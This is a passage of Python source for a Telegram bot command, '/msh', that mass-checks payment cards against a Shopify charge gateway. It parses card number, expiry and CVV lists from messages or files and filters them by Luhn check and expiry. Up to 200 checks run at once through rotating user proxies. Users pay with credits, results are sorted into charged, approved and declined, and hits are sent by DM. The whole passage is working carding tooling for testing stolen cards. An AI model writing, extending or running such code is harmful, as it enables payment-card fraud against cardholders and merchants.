        if proxy_manager:
            stats = proxy_manager.get_stats()
            print(f"📊 [ProxyManager Stats] Total: {stats['total_proxies']}, Active: {stats['active']}, Failed: {stats['failed']}, Uses: {stats['total_uses']}")
            logging.info(f"📊 [ProxyManager Stats] {stats}")

        session['last_text'] = ""
        await update_progress_message(callback.bot, session_id)

    except Exception as e:
        logging.error(f"Error handling stop callback: {e}", exc_info=True)
        try:
            await _safe_answer(callback, "❌ Error stopping", show_alert=True)
        except:
            pass


@router.callback_query(MshSelCallback.filter())
async def handle_selection_callback(callback: types.CallbackQuery, callback_data: MshSelCallback):
    try:
        sel_id = callback_data.sel_id
        action = callback_data.action
        pending = MSH_PENDING.get(sel_id)

        if not pending:
            await _safe_answer(callback, "⚠️ Selection expired — run /msh again.", show_alert=True)
            return
        if callback.from_user.id != pending.get("user_id"):
            await _safe_answer(callback, "❌ No permission", show_alert=True)
            return

        if action == "charged":
            pending["charged"] = not pending["charged"]
        elif action == "approved":
            pending["approved"] = not pending["approved"]
        elif action == "start":
            MSH_PENDING.pop(sel_id, None)
            charged = pending.get("charged", True)
            approved = pending.get("approved", False)
            try:
                await callback.message.edit_text("🚀 Starting mass check...", parse_mode="HTML")
            except Exception:
                pass
            await _safe_answer(callback, "🚀 Starting...")
            asyncio.create_task(process_mass_check_background(
                callback.message, callback.bot, pending["cards"], pending["user_obj"],
                pending["proxies"], pending.get("is_group", False),
                send_approved=approved, send_charged=charged,
            ))
            return

        charged = pending.get("charged", True)
        approved = pending.get("approved", False)
        try:
            await callback.message.edit_text(
                _selection_text(charged, approved, len(pending.get("cards", []))),
                parse_mode="HTML",
                reply_markup=_selection_keyboard(sel_id, charged, approved),
            )
        except Exception as e:
            logging.error(f"Selection edit error: {e}")
        await _safe_answer(callback, "✅ Updated")
    except Exception as e:
        logging.error(f"Error handling selection callback: {e}", exc_info=True)
        try:
            await _safe_answer(callback, "❌ Error", show_alert=True)
        except Exception:
            pass


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/msh") | F.caption.startswith("/msh"))
async def msh_command(message: types.Message):
    if not await asyncio.to_thread(is_gate_enabled, "msh"):
        await safe_reply(message, "🚧 <b>𝗠𝗮𝘀𝘀 𝗚𝗮𝘁𝗲 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>", parse_mode="HTML")
        return

    user = message.from_user
    user_id = user.id
    bot = message.bot

    is_premium, _ = get_premium_status(user_id)
    if not is_premium:
        await safe_reply(message, 
            "💎𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝗽𝗴𝗿𝗮𝗱𝗲 𝘆𝗼𝘂𝗿 𝗽𝗹𝗮𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗳𝗲𝗮𝘁𝘂𝗿𝗲.\n\n👉 𝗨𝘀𝗲 /plan 𝘁𝗼 𝘂𝗽𝗴𝗿𝗮𝗱𝗲.",
            parse_mode="HTML"
        )
        return

    is_checking = False
    for session_id, session_data in list(MSH_SESSIONS.items()):
        if session_data.get('user_id') == user_id and session_data.get('status') == "𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴...":
            is_checking = True
            break

    if is_checking:
        await safe_reply(message, 
            "⚠️ <b>𝗔𝗰𝘁𝗶𝘃𝗲 𝗦𝗲𝘀𝘀𝗶𝗼𝗻</b>\n\n"
            "You have a check running.\n"
            "Use the <b>🛑 Stop</b> button to stop it.",
            parse_mode="HTML"
        )
        return

    user_proxies = await get_user_proxies(user_id)
    if not user_proxies:
        await safe_reply(message, 
            "⚠️ <b>𝗡𝗼 𝗣𝗿𝗼𝘅𝗶𝗲𝘀!</b>\n\n"
            "Add proxies first with <b>/proxy</b> — they auto-load from your pool.",
            parse_mode="HTML"
        )
        return

    # ── Collect raw text from command, reply, caption, and/or attached file ──
    raw_text = ""

    # Command inline text (works whether the trigger came via .text or .caption)
    cmd_text = message.text or message.caption or ""
    parts = cmd_text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1] + " "

    # Text / caption from a replied-to message
    if message.reply_to_message:
        replied_msg = message.reply_to_message
        if replied_msg.text:
            raw_text += replied_msg.text + " "
        elif replied_msg.caption:
            raw_text += replied_msg.caption + " "

    # Document: prefer the current message's attachment, then a replied-to doc
    document = message.document
    if not document and message.reply_to_message:
        document = message.reply_to_message.document

    file_cards = []
    if document:
        try:
            file_cards = await download_and_extract_chunked(bot, document)
        except Exception as e:
            await safe_reply(message, f"❌ Error reading file: {e}")
            return

    if not raw_text.strip() and not file_cards:
        await safe_reply(message, 
            "❌ <b>𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.</b>\n\n"
            "• <code>/msh cc|mm|yy|cvv</code>\n"
            "• Reply to cards with <code>/msh</code>\n"
            "• Send .txt file with <code>/msh</code>",
            parse_mode="HTML"
        )
        return

    # ── Extract & validate cards here so we can check credits upfront ──
    extracted_cards = extract_cards_from_text(raw_text)
    if file_cards:
        _seen = set(extracted_cards)
        extracted_cards.extend(c for c in file_cards if c not in _seen)
    if not extracted_cards:
        await safe_reply(message, "❌ No valid card formats found.")
        return

    valid_cards = []
    expired_count = 0
    invalid_luhn_count = 0
    is_owner = is_owner_user(user_id)
    for card_string in extracted_cards:
        parts_c = card_string.split('|')
        if len(parts_c) != 4:
            continue
        cc, mm, yy, cvv = parts_c
        if not luhn_check(cc):
            invalid_luhn_count += 1
            continue
        if is_expired(mm, yy):
            expired_count += 1
            continue
        valid_cards.append((card_string, cc))

    total_cards = len(valid_cards)
    if total_cards == 0:
        filter_info = ""
        if expired_count > 0 or invalid_luhn_count > 0:
            filter_info = f"Filtered {invalid_luhn_count} invalid & {expired_count} expired.\n"
        await safe_reply(message, f"{filter_info}❌ No valid cards to check.", parse_mode="HTML")
        return

    # ── Credit check: user must have at least 1 credit per card ──
    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits < total_cards:
        await safe_reply(message, 
            f"❌ <b>𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗖𝗿𝗲𝗱𝗶𝘁𝘀</b>\n\n"
            f"You need <b>{total_cards}</b> credits to check <b>{total_cards}</b> cards.\n"
            f"Your balance: <b>{current_credits}</b> credits.\n\n"
            f"Please add more credits or reduce the number of cards.",
            parse_mode="HTML"
        )
        return

    # Detect if the command was sent from a group or supergroup
    is_group = message.chat.type in ("group", "supergroup", "channel")

    # ── Selection UI: ask which hits to DM before starting ──
    sel_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    MSH_PENDING[sel_id] = {
        "user_id": user_id,
        "cards": valid_cards,
        "user_obj": user,
        "proxies": user_proxies,
        "is_group": is_group,
        "charged": True,
        "approved": False,
        "msg_id": None,
        "chat_id": message.chat.id,
    }
    sel_msg = await safe_reply(message, 
        _selection_text(True, False, total_cards),
        parse_mode="HTML",
        reply_markup=_selection_keyboard(sel_id, True, False),
    )
    MSH_PENDING[sel_id]["msg_id"] = sel_msg.message_id

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND PROCESSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_mass_check_background(message: types.Message, bot: Bot, valid_cards: list, user_obj, user_proxies, is_group: bool = False, send_approved: bool = False, send_charged: bool = True):
    """
    Receives a pre-validated list of (card_string, cc_num) tuples.
    Card extraction, Luhn/expiry validation, and credit checks are all
    performed upfront in msh_command before this task is launched.
    """
    user_id = user_obj.id
    chat_id = message.chat.id

    total_cards = len(valid_cards)
    if total_cards == 0:
        await safe_reply(message, "❌ No valid cards to check.", parse_mode="HTML")
        return

    session_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    plan_name = await get_user_plan_name(user_id)

    proxy_manager = ProxyManager(user_proxies, session_id, user_id)
    proxy_stats = proxy_manager.get_stats()

    logging.info(f"🔄 [MSH] Session {session_id} initialized with ProxyManager: {proxy_stats['total_proxies']} proxies (normalized)")

    initial_text = (
        f"<a href='https://t.me/Darkxranger'>✧</a> <b>𝐒𝐭𝐚𝐭𝐮𝐬   ➠</b>   𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴...<tg-emoji emoji-id=\"6253754970349243649\">✨</tg-emoji>\n"
        f"<a href='https://t.me/Darkxranger'>✧</a> <b>𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐈𝐃 ➠</b> <code>{session_id}</code>\n"
        f"<a href='https://t.me/Darkxranger'>✧</a> <b>𝐓𝐨𝐭𝐚𝐥 ➠</b> <code>「 0/{total_cards} 」</code>\n"
        f"      <tg-emoji emoji-id=\"{PROGRESS_EMOJI_ID}\">⏳</tg-emoji> <b>𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬 ➠</b> <code>░░░░░░░░░░</code> <b>0.0%</b>\n"
        f"      <tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">💎</tg-emoji> <b>𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ➠</b> <b>0 </b>\n"
        f"      <tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji> <b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ➠</b> <b>0 </b>\n"
        f"      <tg-emoji emoji-id=\"{CUSTOM_DECLINED_EMOJI_ID}\">❌</tg-emoji> <b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ➠</b> <b>0 </b>\n"
        f"<a href='https://t.me/Darkxranger'>π</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➠</b> 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐫𝐧𝐝. 𝐂𝐡𝐚𝐫𝐠𝐞\n"
        f"      <tg-emoji emoji-id=\"6255910249362885846\">⚠️</tg-emoji> <b>𝐄𝐫𝐫𝐨𝐫 ➠</b> <b>0 </b>\n"
        f"      <tg-emoji emoji-id=\"5258419835922030550\">🕔</tg-emoji> <b>𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➠</b> <b>0s</b>\n"
        f"<b><tg-emoji emoji-id=\"5429495925284296642\">🚬</tg-emoji> 𝐃𝐞𝐯 ➠</b> <a href='https://t.me/Darkxranger'>DarkxRanger</a>"
        
    )

    initial_buttons = get_result_buttons(session_id, is_running=True)

    progress_msg = await safe_reply(message, initial_text, parse_mode="HTML", reply_markup=initial_buttons, disable_web_page_preview=True)

    MSH_SESSIONS[session_id] = {
        "session_id": session_id,
        "status": "𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴...",
        "chat_id": chat_id,
        "user_id": user_id,
        "msg_id": progress_msg.message_id,
        "user_msg_id": message.message_id,
        "total": total_cards,
        "checked": 0,
        "approved": 0,
        "charged": 0,
        "dead": 0,
        "errors": 0,
        "start_time": time.time(),
        "tasks": [],
        "proxies": user_proxies,
        "proxy_manager": proxy_manager,
        "bad_proxies": [],
        "last_text": "",
        "last_update_time": 0,
        "live_cards": [],
        "dead_cards": [],
        "charged_cards": [],
        "error_cards": [],
        "user_obj": user_obj,
        "plan_name": plan_name,
        "is_group": is_group,  # Track whether started from a group
        "send_approved": send_approved,
        "send_charged": send_charged,
    }

    print(f"🚀 [MSH] Started - {total_cards} cards - User: {user_id} - Proxies: {len(user_proxies)} - Group: {is_group}")
    logging.info(f"🚀 [MSH] Started - {total_cards} cards - User: {user_id} - Proxies: {len(user_proxies)} - Group: {is_group}")

    asyncio.create_task(run_mass_checker(bot, session_id, valid_cards, user_obj, plan_name))

async def recheck_error_cards(bot: Bot, session_id, user_obj, plan_name):
    """Second pass over errored cards. After this, session['errors'] reflects
    only the cards that are STILL erroring (the rest got recovered into
    declined/approved/charged)."""
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return
    error_cards = list(session.get('error_cards', []))
    if not error_cards:
        return

    original_errors = len(error_cards)
    checked_before = session.get('checked', 0)

    # reset error tracking before the recheck pass
    session['error_cards'] = []
    session['errors'] = 0

    sem = asyncio.Semaphore(200)

    async def worker(cd):
        cc = cd.get('card', '')
        parts = cc.split('|')
        if len(parts) != 4:
            return
        async with sem:
            if is_session_stopped(session_id):
                return
            try:
                await process_single_card(
                    session_id, cc, parts[0],
                    session['user_id'], bot, user_obj, plan_name
                )
            except Exception as e:
                logging.error(f"[MSH] recheck error for {cc}: {e}")

    await asyncio.gather(*[worker(cd) for cd in error_cards], return_exceptions=True)

    # recheck reprocessed existing cards, not new ones -> restore checked total
    session['checked'] = checked_before

    remaining = len(session.get('error_cards', []))
    recovered = original_errors - remaining

    session['recheck_before'] = original_errors
    session['recheck_recovered'] = recovered
    session['recheck_remaining'] = remaining

    print(f"🔁 [MSH] Recheck: {original_errors} errors -> {recovered} recovered, {remaining} remaining")
    logging.info(f"🔁 [MSH] Recheck: {original_errors} -> {recovered} recovered, {remaining} remaining")


async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
    session = MSH_SESSIONS.get(session_id)
    if not session: return

    sem = asyncio.Semaphore(200)

    async def worker(cc_formatted, cc_num):
        if is_session_stopped(session_id):
            return
        async with sem:
            if is_session_stopped(session_id):
                return
            try:
                await process_single_card(
                    session_id, cc_formatted, cc_num,
                    session['user_id'], bot, user_obj, plan_name
                )
            except asyncio.CancelledError:
                print(f"🛑 [MSH] Task cancelled: {cc_formatted}")
                raise
            except Exception as e:
                if not is_session_stopped(session_id):
                    logging.error(f"Worker error for {cc_formatted}: {e}")

    tasks = []
    for cc_formatted, cc_num in cards:
        if is_session_stopped(session_id):
            print(f"🛑 [MSH] Stopped creating tasks - {len(tasks)} created")
            break
        task = asyncio.create_task(worker(cc_formatted, cc_num))
        tasks.append(task)
        session['tasks'].append(task)

    print(f"📋 [MSH] {len(tasks)} tasks created")
    logging.info(f"📋 [MSH] {len(tasks)} tasks created")

    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)

        cancelled = sum(1 for r in results if isinstance(r, asyncio.CancelledError))
        errors = sum(1 for r in results if isinstance(r, Exception) and not isinstance(r, asyncio.CancelledError))

        if cancelled > 0:
            print(f"🛑 [MSH] {cancelled} tasks cancelled")

        if errors > 0:
            logging.error(f"[MSH] {errors} tasks failed with exceptions")

    # Recheck pass: retry errored cards once so the Error counter shows only
    # the cards that are STILL failing after the retry.
    session = MSH_SESSIONS.get(session_id)
    if session and session['status'] != "𝗦𝘁𝗼𝗽𝗽𝗲𝗱":
        await recheck_error_cards(bot, session_id, user_obj, plan_name)

    session = MSH_SESSIONS.get(session_id)
    if session and session['status'] != "𝗦𝘁𝗼𝗽𝗽𝗲𝗱":
        session['status'] = "𝗦𝘂𝗺𝗺𝗮𝗿𝘆"

    await update_progress_message(bot, session_id)

    print(f"✅ [MSH] Session {session_id} finished")
    logging.info(f"✅ [MSH] Session {session_id} finished")
